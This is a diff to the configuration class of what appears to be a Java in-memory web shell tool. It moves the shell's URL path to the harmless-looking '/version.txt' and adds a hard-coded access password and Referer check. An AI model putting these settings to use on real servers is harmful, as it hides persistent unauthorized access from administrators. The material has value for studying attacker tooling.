@@ -34,8 +34,12 @@ public class Config {
 	public static int HIDE_MEMORY_SHELL_TYPE = 0;
 
 	// 各种方式的内存马映射的路径
-	public static String URL_PATTERN = "/su18";
+	public static String URL_PATTERN = "/version.txt";
 
+	// 内存马的密码
+	public static String PASSWORD = "f359740bd1cda994";
+
+	public static String REFERER = "https://su18.org/";
 
 	// 不同类型内存马的父类/接口与其关键参数的映射
 	public static HashMap<String, String> KEY_METHOD_MAP = new HashMap<>();
